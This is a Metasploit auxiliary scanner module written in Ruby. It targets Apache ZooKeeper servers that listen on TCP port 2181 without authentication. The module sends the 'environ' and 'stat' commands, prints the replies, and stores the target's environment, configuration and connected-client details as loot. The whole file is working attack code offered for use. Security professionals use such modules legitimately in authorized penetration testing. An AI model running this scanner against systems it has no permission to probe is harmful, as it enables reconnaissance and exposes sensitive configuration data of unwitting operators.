##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Apache ZooKeeper Information Disclosure',
      'Description' => %q{
        Apache Zookeeper server service runs on TCP 2181 and by default, it is accessible without any authentication. This module targets Apache ZooKeeper service instances to extract information about the system environment, and application configuration.
      },
      'References' =>
        [
          ['URL', 'https://zookeeper.apache.org/doc/current/zookeeperAdmin.html']
        ],
      'Author' =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
        ],
      'DisclosureDate' => 'Oct 14, 2020',
      'License' => MSF_LICENSE,
      'DefaultOptions' => { 'VERBOSE' => true })
      )

    register_options(
      [
        Opt::RPORT(2181),
        OptInt.new('TIMEOUT', [true, 'Timeout for the probe', 30])
      ], self.class
    )

    deregister_options('USERNAME', 'PASSWORD')
  end

  def run_host(ip)
    to = (datastore['TIMEOUT'].zero?) ? 30 : datastore['TIMEOUT']
    begin
      ::Timeout.timeout(to) do
        connect
        print_status('Dumping environment info...')
        sock.put('environ')
        data = sock.get_once(-1, to).to_s
        print_good("#{data}")
        sock.close

        loot_name = 'environ-log'
        loot_type = 'text/plain'
        loot_desc = 'Zookeeper Environment Log'
        loot_service = 'Zookeeper'
        p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)
        print_good("File saved in: #{p} \n")
        report_service(host: rhost, port: rport, name: 'Zookeeper', info: 'Apache Zookeeper')

        connect
        print_status('Dumping statistics about performance and connected clients...')
        sock.put('stat')
        data = sock.get_once(-1, to).to_s
        print_good("#{data}")
        sock.close

        loot_name = 'stat-log'
        loot_type = 'text/plain'
        loot_desc = 'Zookeeper Stat Log'
        loot_service = 'Zookeeper'
        p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)
        print_good("File saved in: #{p} \n")
        report_service(host: rhost, port: rport, name: 'Zookeeper', info: 'Apache Zookeeper')
      end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - Connection Failed...")
    ensure
      disconnect
    end
  end
end
